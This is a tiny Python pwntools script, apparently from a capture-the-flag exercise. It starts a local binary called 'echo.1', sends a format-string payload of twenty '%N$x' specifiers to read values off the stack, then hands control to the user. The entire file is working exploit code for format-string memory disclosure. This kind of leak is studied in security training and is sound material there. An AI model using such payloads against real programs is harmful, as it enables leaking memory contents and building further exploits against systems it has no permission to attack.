from pwn import * 

target = process("./echo.1")
payload = ""
for i in range(20):
	payload += f"%{14+i}$x"

target.sendline(payload.encode())

target.interactive()